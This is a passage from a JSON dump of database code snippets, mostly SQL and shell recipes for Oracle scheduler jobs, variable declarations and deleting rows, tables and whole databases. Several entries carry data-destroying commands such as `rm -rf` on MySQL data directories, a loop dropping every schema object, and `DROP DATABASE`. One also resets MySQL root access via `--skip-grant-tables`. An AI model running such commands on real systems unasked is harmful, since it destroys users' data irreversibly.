    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 787,
    "keyword": null,
    "link": null,
    "title": " db begintransaction laravel",
    "description": "// try...catch try {     // Transaction     $exception = DB::transaction(function() {          // Do your SQL here      });      if(is_null($exception)) {         return true;     } else {         throw new Exception;     }  } catch(Exception $e) {     return false; } \nDB::beginTransaction();  try {     DB::insert(...);     DB::insert(...);     DB::insert(...);      DB::commit();     // all good } catch (\\Exception $e) {     DB::rollback();     // something went wrong } \nDB::beginTransaction();  try {     DB::insert(...);         DB::commit(); } catch (\\Throwable $e) {     DB::rollback();     throw $e; }\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 788,
    "keyword": null,
    "link": null,
    "title": " db connection driver class xml property for mysql 8",
    "description": "<property name=\"connection.driver_class\">com.mysql.cj.jdbc.Driver</property>\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 789,
    "keyword": null,
    "link": null,
    "title": " dba dependencies",
    "description": "-- Dependencies on a view, table, ... SELECT *   FROM ALL_DEPENDENCIES\t\t\t-- or DBA_DEPENDENCIES or USER_DEPENDENCIES  WHERE TYPE = 'VIEW'\t\t\t-- or 'PROCEDURE', 'SYNONYM'...    AND REFERENCED_OWNER = 'OBJECT_OWNER'    AND REFERENCED_NAME = 'OBJECT_NAME';\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 790,
    "keyword": null,
    "link": null,
    "title": " dba jobs history",
    "description": "SELECT LOG_DATE, OWNER, JOB_NAME, JOB_SUBNAME, STATUS,        ACTUAL_START_DATE, RUN_DURATION, CPU_USED, ADDITIONAL_INFO FROM ALL_SCHEDULER_JOB_RUN_DETAILS   \t-- or DBA_SCHEDULER_JOB_RUN_DETAILS WHERE JOB_NAME = 'job_name' ORDER BY LOG_DATE DESC;\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 791,
    "keyword": null,
    "link": null,
    "title": " dba scheduler jobs",
    "description": "SELECT OWNER, JOB_NAME, ENABLED, JOB_CLASS, NEXT_RUN_DATE FROM DBA_SCHEDULER_JOBS WHERE OWNER NOT IN ('SYS') ORDER BY ENABLED, OWNER, JOB_NAME;  -- Running jobs: SELECT OWNER, JOB_NAME, JOB_SUBNAME, JOB_STYLE, SESSION_ID, SLAVE_PROCESS_ID,  \tELAPSED_TIME, CPU_USED  FROM DBA_SCHEDULER_RUNNING_JOBS ORDER BY OWNER, JOB_NAME;\nSELECT LOG_DATE, OWNER, JOB_NAME, JOB_SUBNAME, STATUS,        ACTUAL_START_DATE, RUN_DURATION, CPU_USED, ADDITIONAL_INFO FROM ALL_SCHEDULER_JOB_RUN_DETAILS   \t-- or DBA_SCHEDULER_JOB_RUN_DETAILS WHERE JOB_NAME = 'job_name' ORDER BY LOG_DATE DESC;\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 792,
    "keyword": null,
    "link": null,
    "title": " dba scheduler jobs history",
    "description": "SELECT LOG_DATE, OWNER, JOB_NAME, JOB_SUBNAME, STATUS,        ACTUAL_START_DATE, RUN_DURATION, CPU_USED, ADDITIONAL_INFO FROM ALL_SCHEDULER_JOB_RUN_DETAILS   \t-- or DBA_SCHEDULER_JOB_RUN_DETAILS WHERE JOB_NAME = 'job_name' ORDER BY LOG_DATE DESC;\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 793,
    "keyword": null,
    "link": null,
    "title": " dbms metadata.get ddl table",
    "description": "-- 4000 characters max SELECT dbms_metadata.get_ddl('PROCOBJ', 'job_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('PROCOBJ', 'program_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('TABLE', 'table_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('VIEW', 'view_name', 'owner') FROM DUAL;  SELECT dbms_metadata.get_ddl('PACKAGE', 'pkg_name', 'owner') FROM DUAL;  SELECT dbms_metadata.get_ddl('PROCEDURE', 'proc_name', 'owner') FROM DUAL;   SELECT dbms_metadata.get_ddl('INDEX', 'index_name', 'owner') FROM DUAL; SELECT dbms_metadata.get_ddl('TYPE', 'type_name', 'owner') FROM DUAL;\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 794,
    "keyword": null,
    "link": null,
    "title": " dbms output.put line not working in sql developer",
    "description": "-- SQL Developer :  show View | DBMS Output > Add connection (+) SET SERVEROUTPUT ON; BEGIN \tDBMS_OUTPUT.PUT_LINE('Hello !'); END;\n",
    "reg_date": "2021-10-12T09:54:54.000Z"
  },
  {
    "id": 795,
    "keyword": null,
    "link": null,
    "title": " dbms output",
    "description": "dbms_output.put_line(\"YOUR MESSAGE\"); \n--Before the declare set serveroutput on; --In the anon block/procedure/package/... DBMS_OUTPUT.PUT_LINE( 'Hello world' );\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 796,
    "keyword": null,
    "link": null,
    "title": " dbms output sql developer",
    "description": "SET SERVEROUTPUT ON BEGIN  Dbms_Output.Put_Line(Systimestamp); END;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 797,
    "keyword": null,
    "link": null,
    "title": " dbms scheduler.create job example",
    "description": "BEGIN   dbms_scheduler.drop_job(job_name => 'MY_JOB'); END;\nBEGIN     DBMS_SCHEDULER.CREATE_JOB(       job_name => '\"MYSCHEMA\".\"JOB_NAME\"',       job_type => 'STORED_PROCEDURE',       job_action => 'MYSCHEMA.PROCEDURE',       number_of_arguments => 0,       start_date => to_timestamp_tz(         '2021-04-08 14:19:32.000000000 EUROPE/PARIS',          'YYYY-MM-DD HH24:MI:SS.FF TZR'),       repeat_interval =>        'FREQ=DAILY;BYDAY=MON,TUE,WED,THU,FRI;BYHOUR=12;BYMINUTE=30;BYSECOND=0',       end_date => NULL,       enabled => FALSE,       auto_drop => FALSE,       comments => 'Job description');      DBMS_SCHEDULER.enable(             name => '\"MYSCHEMA\".\"JOB_NAME\"'); END;\nSELECT OWNER, JOB_NAME, ENABLED, JOB_CLASS, NEXT_RUN_DATE FROM DBA_SCHEDULER_JOBS WHERE OWNER NOT IN ('SYS') ORDER BY ENABLED, OWNER, JOB_NAME;  -- Running jobs: SELECT OWNER, JOB_NAME, JOB_SUBNAME, JOB_STYLE, SESSION_ID, SLAVE_PROCESS_ID,  \tELAPSED_TIME, CPU_USED  FROM DBA_SCHEDULER_RUNNING_JOBS ORDER BY OWNER, JOB_NAME;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 798,
    "keyword": null,
    "link": null,
    "title": " dbms scheduler drop job",
    "description": "BEGIN   dbms_scheduler.drop_job(job_name => 'MY_JOB'); END;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 799,
    "keyword": null,
    "link": null,
    "title": " dbms scheduler list jobs",
    "description": "SELECT OWNER, JOB_NAME, ENABLED, JOB_CLASS, NEXT_RUN_DATE FROM DBA_SCHEDULER_JOBS WHERE OWNER NOT IN ('SYS') ORDER BY ENABLED, OWNER, JOB_NAME;  -- Running jobs: SELECT OWNER, JOB_NAME, JOB_SUBNAME, JOB_STYLE, SESSION_ID, SLAVE_PROCESS_ID,  \tELAPSED_TIME, CPU_USED  FROM DBA_SCHEDULER_RUNNING_JOBS ORDER BY OWNER, JOB_NAME;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 800,
    "keyword": null,
    "link": null,
    "title": " dbms scheduler stop job",
    "description": "BEGIN   dbms_scheduler.drop_job(job_name => 'MY_JOB'); END;\n-- To simply stop job without killing session: BEGIN     DBMS_SCHEDULER.STOP_JOB(JOB_NAME => 'scheme.job_name', FORCE => TRUE); END; -- Killing job's session: first get Job session IDs SELECT jr.JOB, s.USERNAME, s.SID, s.SERIAL#, p.SPID, s.LOCKWAIT, s.LOGON_TIME FROM DBA_JOBS_RUNNING jr, V$SESSION s, V$PROCESS p WHERE jr.SID = s.SID AND s.PADDR = p.ADDR ORDER BY jr.JOB; -- Kill session with IDs and wait for rollback if any... ALTER SYSTEM KILL SESSION 'SID,SERIAL#' IMMEDIATE;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 801,
    "keyword": null,
    "link": null,
    "title": " ddl materialized view",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 802,
    "keyword": null,
    "link": null,
    "title": " ddl view",
    "description": "-- Views (use USER_VIEWS or DBA_VIEWS if needed): SELECT TEXT FROM ALL_VIEWS WHERE upper(VIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('VIEW', 'VIEW_NAME', 'OWNER_NAME') FROM DUAL;  -- Materialized views (use USER_VIEWS or DBA_VIEWS if needed): SELECT QUERY FROM ALL_MVIEWS WHERE upper(MVIEW_NAME) LIKE upper('%VIEW_NAME%'); -- Or: SELECT dbms_metadata.get_ddl('MATERIALIZED_VIEW', 'VIEW_NAME', 'OWNER_NAME')  FROM DUAL;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 803,
    "keyword": null,
    "link": null,
    "title": " declarative base sqlalchemy",
    "description": "from sqlalchemy import Column, Integer, String from sqlalchemy.ext.declarative import declarative_base  Base = declarative_base()  class SomeClass(Base):     __tablename__ = 'some_table'     id = Column(Integer, primary_key=True)     name =  Column(String(50))\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 804,
    "keyword": null,
    "link": null,
    "title": " declare date variable sql",
    "description": "//The code below will get you a date and time 72 ago. DECLARE @HoursAgo DATETIME = DATEADD(HOUR, -72, GETDATE()); SELECT @HoursAgo AS DaysOrHoursAgo;\n",
    "reg_date": "2021-10-12T09:54:55.000Z"
  },
  {
    "id": 805,
    "keyword": null,
    "link": null,
    "title": " declare table variable sql server",
    "description": "DECLARE @table_variable_name TABLE (     column_list );  Example: DECLARE @product_table TABLE (     product_name VARCHAR(MAX) NOT NULL,     brand_id INT NOT NULL,     list_price DEC(11,2) NOT NULL );\nDECLARE @TABLE TABLE( COL1 INT, COL2 VARCHAR(30))\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 806,
    "keyword": null,
    "link": null,
    "title": " declare value in sql",
    "description": "-- Declare the variable to be used. DECLARE @MyCounter int;  -- Initialize the variable. SET @MyCounter = 0;\nDECLARE @COURSE_ID AS INT, @COURSE_NAME VARCHAR (10); \nDECLARE  { @LOCAL_VARIABLE[AS] data_type  [ = value ] } \n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 807,
    "keyword": null,
    "link": null,
    "title": " declare variable in stored procedure in sql server",
    "description": "                                     DECLARE      @product_name VARCHAR(MAX),     @list_price DECIMAL(10,2); \n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 808,
    "keyword": null,
    "link": null,
    "title": " declaring variables in pl sql",
    "description": "# variableName variableType := Value; # EG : DECLARE \tname varchar(15) := 'Name'; BEGIN \tDBMS_OUTPUT.PUT_LINE(name) END;  \n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 809,
    "keyword": null,
    "link": null,
    "title": " default column value in sql same as another column laravel",
    "description": "Schema::table('users', function(Blueprint $table) {     $table->dateTime('last_activity'); });  \\DB::statement('UPDATE users SET last_activity = updated_at');\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 810,
    "keyword": null,
    "link": null,
    "title": " default constraint in ms sql",
    "description": "/*Alter an existing column to add a default constraint*/ ALTER TABLE (Table_Name) ADD CONSTRAINT (Constraint_Name) DEFAULT (Default_Value) FOR (Existing_Column_Name) \n/*Adding a New Column, with default value to an existing table*/ ALTER TABLE (Table_Name) ADD (Column_Name)(Data_Type) (Null/NOT NULL) CONSTRAINT (Constraint_Name) DEFAULT (Default_Value)\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 811,
    "keyword": null,
    "link": null,
    "title": " default number in sql",
    "description": "//Sql Server  //Add a table  ALTER TABLE clients ADD Points INT DEFAULT 0 //Edit an existing table ALTER TABLE clients ADD CONSTRAINT points DEFAULT 0 FOR Points\nName Varchar(255) default \"Fred\"\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 812,
    "keyword": null,
    "link": null,
    "title": " default password for mysql secure installation in mac",
    "description": "$ brew services stop mysql $ pkill mysqld $ rm -rf /usr/local/var/mysql/ # NOTE: this will delete your existing database!!! $ brew postinstall mysql $ brew services restart mysql $ mysql -uroot\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 813,
    "keyword": null,
    "link": null,
    "title": " default password of mysql",
    "description": "mysqladmin -u root password NEWPASSWORD\nuser:root #The password is empty password: #If by accident you set the password and you don't remember it service mysql stop #Stop mysql service mysqld_safe --skip-grant-tables & #disable \"login\" mysql #Log in into mysql, you should see mysql> in prompt UPDATE mysql.user SET Password=PASSWORD('new-password') WHERE User='root'; FLUSH PRIVILEGES; # exit; # exit from mysql mysqladmin -u root -p shutdown # shutdown mysql service service mysql start # Restart your service\nmysql_secure_connection\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 814,
    "keyword": null,
    "link": null,
    "title": " default sql server port",
    "description": "1433\nThe default port of SQL server is 1433.\n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 815,
    "keyword": null,
    "link": null,
    "title": " define a variable in mysql from select",
    "description": "SELECT salary INTO @variable1 FROM employee_info WHERE emp_id = 12345678 LIMIT 1; SELECT salary, salary_group INTO @var1, @var2 FROM employee_info WHERE emp_id = 12345678; \n",
    "reg_date": "2021-10-12T09:54:56.000Z"
  },
  {
    "id": 816,
    "keyword": null,
    "link": null,
    "title": " delete a record from a table sqlite3",
    "description": "DELETE FROM table WHERE search_condition;\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 817,
    "keyword": null,
    "link": null,
    "title": " delete all content in table mysql",
    "description": "TRUNCATE tablename\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 818,
    "keyword": null,
    "link": null,
    "title": " delete all entries postgres",
    "description": "DELETE FROM tablename;\nDELETE FROM table USING another_table WHERE table.id = another_table.id;\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 819,
    "keyword": null,
    "link": null,
    "title": " delete all hangfire tables sql query",
    "description": "GO PRINT N'Dropping [HangFire].[FK_HangFire_State_Job]...'; GO ALTER TABLE [HangFire].[State] DROP CONSTRAINT [FK_HangFire_State_Job]; GO PRINT N'Dropping [HangFire].[FK_HangFire_JobParameter_Job]...'; GO ALTER TABLE [HangFire].[JobParameter] DROP CONSTRAINT [FK_HangFire_JobParameter_Job]; GO PRINT N'Dropping [HangFire].[Schema]...'; GO DROP TABLE [HangFire].[Schema]; GO PRINT N'Dropping [HangFire].[Job]...'; GO DROP TABLE [HangFire].[Job]; GO PRINT N'Dropping [HangFire].[State]...'; GO DROP TABLE [HangFire].[State]; GO PRINT N'Dropping [HangFire].[JobParameter]...'; GO DROP TABLE [HangFire].[JobParameter]; GO PRINT N'Dropping [HangFire].[JobQueue]...'; GO DROP TABLE [HangFire].[JobQueue]; GO PRINT N'Dropping [HangFire].[Server]...'; GO DROP TABLE [HangFire].[Server]; GO PRINT N'Dropping [HangFire].[List]...'; GO DROP TABLE [HangFire].[List]; GO PRINT N'Dropping [HangFire].[Set]...'; GO DROP TABLE [HangFire].[Set]; GO PRINT N'Dropping [HangFire].[Counter]...'; GO DROP TABLE [HangFire].[Counter]; GO PRINT N'Dropping [HangFire].[Hash]...'; GO DROP TABLE [HangFire].[Hash]; GO PRINT N'Dropping [HangFire].[AggregatedCounter]...'; GO DROP TABLE [HangFire].[AggregatedCounter]; GO PRINT N'Dropping [HangFire]...'; GO DROP SCHEMA [HangFire]; GO PRINT N'Update complete.'; GO\nTRUNCATE TABLE [HangFire].[AggregatedCounter] TRUNCATE TABLE [HangFire].[Counter] TRUNCATE TABLE [HangFire].[JobParameter] TRUNCATE TABLE [HangFire].[JobQueue] TRUNCATE TABLE [HangFire].[List] TRUNCATE TABLE [HangFire].[State] DELETE FROM [HangFire].[Job] DBCC CHECKIDENT ('[HangFire].[Job]', reseed, 0) UPDATE [HangFire].[Hash] SET Value = 1 WHERE Field = 'LastJobId'\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 820,
    "keyword": null,
    "link": null,
    "title": " delete all nodes neo4j",
    "description": "MATCH (n) DETACH DELETE n;\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 821,
    "keyword": null,
    "link": null,
    "title": " delete all records from table except sql",
    "description": "DELETE FROM table_name;\ndelete from yourTableName where yourColumnName NOT IN(&lsquo;yourValue1&rsquo;,&lsquo;yourValue2&rsquo;,&lsquo;yourValue3&rsquo;,.........N);\nDELETE FROM my_table WHERE col1 > 2; DELETE FROM my_table WHERE col1 IS NOT NULL;\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 822,
    "keyword": null,
    "link": null,
    "title": " delete all rows from table mysql",
    "description": "-- If you do not need a condition or limit the rows: TRUNCATE TABLE tblYourTable; -- Not Foreign key constrained  -- Or  SET FOREIGN_KEY_CHECKS = 0;  TRUNCATE YourTable1; TRUNCATE YourTable2;  SET FOREIGN_KEY_CHECKS = 1;  -- -------------------------------------------------------- -- Otherwise: DELETE FROM tblYourTable WHERE condition;  -- Or  DELETE FROM tblYourTable LIMIT row_count;\n/* Will delete all rows from your table. Next insert will take next auto increment id. */ DELETE from tableName; /* Will delete all rows from your table but it will start from new row with 1. */ TRUNCATE tableName;\nDELETE FROM table_name;\n-- Quick, no possible rollback TRUNCATE TABLE my_table; -- With rollback DELETE FROM my_table; COMMIT;\nTRUNCATE tablename\nDELETE FROM table_name WHERE condition; In this statement: First, specify the table from which you delete data. Second, use a condition to specify which rows to delete in the WHERE clause.  for example: DELETE FROM customers WHERE id = 1;\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 823,
    "keyword": null,
    "link": null,
    "title": " delete all rows from table sql",
    "description": "DELETE FROM table_name;\n-- Quick, no possible rollback TRUNCATE TABLE my_table; -- With rollback DELETE FROM my_table; COMMIT;\nDELETE FROM table1 #delete all record\nDELETE FROM table_name; //will delete the table data without affecting the table structue\n-- Deletes all records where `columnName` matches the values in brackets. DELETE FROM tableName WHERE columnName IN ('val1', 'val2', 'val3');\ndelete from yourTableName where yourColumnName NOT IN(&lsquo;yourValue1&rsquo;,&lsquo;yourValue2&rsquo;,&lsquo;yourValue3&rsquo;,.........N);\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 824,
    "keyword": null,
    "link": null,
    "title": " delete all table oracle",
    "description": "BEGIN    FOR cur_rec IN (SELECT object_name, object_type                    FROM user_objects                    WHERE object_type IN                              ('TABLE',                               'VIEW',                               'MATERIALIZED VIEW',                               'PACKAGE',                               'PROCEDURE',                               'FUNCTION',                               'SEQUENCE',                               'SYNONYM',                               'PACKAGE BODY'                              ))    LOOP       BEGIN          IF cur_rec.object_type = 'TABLE'          THEN             EXECUTE IMMEDIATE 'DROP '                               || cur_rec.object_type                               || ' \"'                               || cur_rec.object_name                               || '\" CASCADE CONSTRAINTS';          ELSE             EXECUTE IMMEDIATE 'DROP '                               || cur_rec.object_type                               || ' \"'                               || cur_rec.object_name                               || '\"';          END IF;       EXCEPTION          WHEN OTHERS          THEN             DBMS_OUTPUT.put_line ('FAILED: DROP '                                   || cur_rec.object_type                                   || ' \"'                                   || cur_rec.object_name                                   || '\"'                                  );       END;    END LOOP;    FOR cur_rec IN (SELECT *                     FROM all_synonyms                     WHERE table_owner IN (SELECT USER FROM dual))    LOOP       BEGIN          EXECUTE IMMEDIATE 'DROP PUBLIC SYNONYM ' || cur_rec.synonym_name;       END;    END LOOP; END; / \nDELETE FROM my_table;\t\t-- all rows, commit needed TRUNCATE TABLE my_table;\t-- all rows, no possible rollback DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2); COMMIT;\t\t-- don't forget it...\nDROP TABLE customers PURGE;\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 825,
    "keyword": null,
    "link": null,
    "title": " delete all value query",
    "description": "DELETE FROM table1 #delete all record\n",
    "reg_date": "2021-10-12T09:54:57.000Z"
  },
  {
    "id": 826,
    "keyword": null,
    "link": null,
    "title": " delete and drop in sql",
    "description": "DELETE - -DML COMMAND -Delete Rows from the table one by one -We can use where clause with Delete to delete single row -Delete is slower than truncate -ROLLBACK is possible with DELETE  DROP- -DDL COMMAND -Delete the entire structure or schema -We can't use where clause with drop -Drop is slower than DELETE & TRUNCATE -ROLLBACK IS NOT POSSIBLE WITH DROP  TRUNCATE- -DDL COMMAND -Truncate deletes rows at a one goal -We can't use where clause with Truncate -Truncate faster than both DELETE & DROP -Rollback is not possible with Truncate\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 827,
    "keyword": null,
    "link": null,
    "title": " delete column from table oracle PL SQL",
    "description": "ALTER TABLE table_name DROP COLUMN column_name;\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 828,
    "keyword": null,
    "link": null,
    "title": " delete database mysql",
    "description": " DROP DATABASE dbname;\nDROP DATABASE ma_base\nDROP DATABASE dbname\nmysql> drop database `my-database`; \nDROP DATABASE databasename\nThe DROP DATABASE statement drops all tables in the database and deletes the database permanently. Therefore, you should be very careful when using this statement.  The following shows the syntax of the DROP DATABASE statement:  DROP DATABASE [IF EXISTS] database_name;    In MySQL, the schema is the synonym for the database, therefore, you can use them interchangeably:  DROP SCHEMA [IF EXISTS] database_name;\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 829,
    "keyword": null,
    "link": null,
    "title": " delete database mysql command",
    "description": " DROP DATABASE dbname;\nDROP DATABASE ma_base\nDROP DATABASE dbname\nmysql> drop database `my-database`; \nDROP DATABASE databasename\nThe DROP DATABASE statement drops all tables in the database and deletes the database permanently. Therefore, you should be very careful when using this statement.  The following shows the syntax of the DROP DATABASE statement:  DROP DATABASE [IF EXISTS] database_name;    In MySQL, the schema is the synonym for the database, therefore, you can use them interchangeably:  DROP SCHEMA [IF EXISTS] database_name;\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 830,
    "keyword": null,
    "link": null,
    "title": " delete db postgres",
    "description": "DROP DATABASE IF EXISTS database_name;\nCREATE DATABASE testdb1; DROP DATABASE testdb1;\n DROP DATABASE base_de_datos;  // SI SALE ESTE MESAJE DE ERROR HAGA LOS PASOS QUE ESTAN A CONTINUACION ERROR: database \"base_de_datos\" is being accessed by other users SQL state: 55006 Detail: There is 1 other session using the database. ----------------------------------------------------------------------  // primer paso --------------------------------- SELECT * FROM pg_stat_activity WHERE datname = 'base_de_datos';  //segundo paso -------------------------------- SELECT \tpg_terminate_backend (pg_stat_activity.pid) FROM \tpg_stat_activity WHERE \tpg_stat_activity.datname = 'base_de_datos';      // tercer paso -------------------------------- DROP DATABASE 'base_de_datos';  // retira las comillas si no funciona DROP DATABASE base_de_datos;\ndropdb 'database name' \nsql -U <user>  -c \"drop database protodb\"\nDROP DATABASE db_name;\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 831,
    "keyword": null,
    "link": null,
    "title": " delete dublicate rows sql",
    "description": "WITH CTE AS(    SELECT [col1], [col2], [col3], [col4], [col5], [col6], [col7],        RN = ROW_NUMBER()OVER(PARTITION BY col1 ORDER BY col1)    FROM dbo.Table1 ) DELETE FROM CTE WHERE RN > 1\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 832,
    "keyword": null,
    "link": null,
    "title": " delete entries in postgresql",
    "description": "DELETE FROM table WHERE condition;\nDELETE FROM tablename;\nDELETE FROM table USING another_table WHERE table.id = another_table.id;\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 833,
    "keyword": null,
    "link": null,
    "title": " delete from inner join sql",
    "description": "    DELETE WorkRecord2        FROM WorkRecord2  INNER JOIN Employee          ON EmployeeRun=EmployeeNo      WHERE Company = '1'         AND Date = '2013-05-06';\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 834,
    "keyword": null,
    "link": null,
    "title": " delete from subquery oracle",
    "description": "DELETE FROM my_table;\t\t-- all rows, commit needed TRUNCATE TABLE my_table;\t-- all rows, no possible rollback DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2); COMMIT;\t\t-- don't forget it...\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 835,
    "keyword": null,
    "link": null,
    "title": " delete from table sql",
    "description": "DROP TABLE table_name;\nDELETE FROM table_name WHERE condition; -- \t\t\tEx. DELETE FROM Customers WHERE CustomerName='Mustafa Mbari';\nDELETE FROM table_name; //will delete the table data without affecting the table structue\nMit DELETE werden einzelne oder mehrere Datens&auml;tze gel&ouml;scht. Mit WHERE  werden nur bestimmte Datens&auml;tez gel&ouml;scht.     DELETE FROM suppliers   WHERE        supplier_name = 'Microsoft'; \nDELETE FROM my_table;\t\t-- all rows DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2); COMMIT;\t\t-- don't forget it...\nDELETE FROM `table` WHERE condition\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 836,
    "keyword": null,
    "link": null,
    "title": " delete mysql from mac",
    "description": "## Open the Terminal  # Use mysqldump to backup your databases  # Check for MySQL processes with:  ps -ax | grep mysql  # Stop and kill any MySQL processes kill -9 [process_id]  # Analyze MySQL on HomeBrew: brew remove mysql brew cleanup  # Remove files: sudo rm /usr/local/mysql sudo rm -rf /usr/local/var/mysql sudo rm -rf /usr/local/mysql* sudo rm ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist sudo rm -rf /Library/StartupItems/MySQLCOM sudo rm -rf /Library/PreferencePanes/My*  # Unload previous MySQL Auto-Login: launchctl unload -w ~/Library/LaunchAgents/homebrew.mxcl.mysql.plist  # Remove previous MySQL Configuration: subl /etc/hostconfig  # Remove the line MYSQLCOM=-YES- # Remove previous MySQL Preferences:  rm -rf ~/Library/PreferencePanes/My* sudo rm -rf /Library/Receipts/mysql* sudo rm -rf /Library/Receipts/MySQL* sudo rm -rf /private/var/db/receipts/*mysql*  ## Restart your computer just to ensure any MySQL processes are killed  Try to run mysql, it shouldn't work\n$ brew uninstall mysql  Uninstalling /usr/local/Cellar/mysql/5.6.19...\n",
    "reg_date": "2021-10-12T09:54:58.000Z"
  },
  {
    "id": 837,
    "keyword": null,
    "link": null,
    "title": " delete mysql ubuntu 20.04",
    "description": "sudo apt remove --purge mysql-server sudo apt purge mysql-server sudo apt autoremove sudo apt autoclean sudo apt remove dbconfig-mysql\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 838,
    "keyword": null,
    "link": null,
    "title": " delete oracle",
    "description": "DELETE FROM customers WHERE last_name = 'Smith';\nDELETE FROM my_table;\t\t-- all rows DELETE FROM my_table WHERE my_id = 12345; DELETE FROM my_table WHERE my_id IN (SELECT id2 FROM my_table2); COMMIT;\t\t-- don't forget it...\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 839,
    "keyword": null,
    "link": null,
    "title": " delete plsql",
    "description": "DELETE FROM customers WHERE last_name = 'Smith';\n",
    "reg_date": "2021-10-12T09:54:59.000Z"
  },
  {
    "id": 840,
    "keyword": null,
    "link": null,
    "title": " delete query in sqlite flutter",
    "description": "// Get a location using getDatabasesPath var databasesPath = await getDatabasesPath(); String path = join(databasesPath, 'demo.db');  // Delete the database await deleteDatabase(path);  // open the database Database database = await openDatabase(path, version: 1,     onCreate: (Database db, int version) async {   // When creating the db, create the table   await db.execute(       'CREATE TABLE Test (id INTEGER PRIMARY KEY, name TEXT, value INTEGER, num REAL)'); });  // Insert some records in a transaction await database.transaction((txn) async {   int id1 = await txn.rawInsert(       'INSERT INTO Test(name, value, num) VALUES(\"some name\", 1234, 456.789)');   print('inserted1: $id1');   int id2 = await txn.rawInsert(       'INSERT INTO Test(name, value, num) VALUES(?, ?, ?)',       ['another name', 12345678, 3.1416]);   print('inserted2: $id2'); });  // Update some record int count = await database.rawUpdate(     'UPDATE Test SET name = ?, value = ? WHERE name = ?',     ['updated name', '9876', 'some name']); print('updated: $count');  // Get the records List<Map> list = await database.rawQuery('SELECT * FROM Test'); List<Map> expectedList = [   {'name': 'updated name', 'id': 1, 'value': 9876, 'num': 456.789},   {'name': 'another name', 'id': 2, 'value': 12345678, 'num': 3.1416} ]; print(list); print(expectedList); assert(const DeepCollectionEquality().equals(list, expectedList));  // Count the records count = Sqflite     .firstIntValue(await database.rawQuery('SELECT COUNT(*) FROM 